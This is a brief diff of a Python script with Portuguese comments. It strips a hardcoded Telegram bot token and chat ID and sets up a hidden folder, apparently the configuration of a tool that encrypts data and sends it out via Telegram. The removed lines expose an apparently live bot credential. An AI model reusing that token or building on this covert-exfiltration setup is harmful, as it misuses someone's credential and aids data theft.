@@ -17,8 +17,8 @@ from cryptography.fernet import Fernet
 # ============================================================
 # CONFIGURAÇÕES (substitua pelos seus dados)
 # ============================================================
-TELEGRAM_TOKEN = "8864441240:AAG1CRcXZW7j35T6TVndHVwFZxdp8KeSi9M"
-TELEGRAM_CHAT_ID = "8525713815"
+TELEGRAM_TOKEN = ""
+TELEGRAM_CHAT_ID = ""
 SISTEMA = platform.system()
 PASTA_OCULTA = os.path.join(
     os.environ.get('APPDATA', '/var/tmp') if SISTEMA == 'Windows' else '/var/tmp',
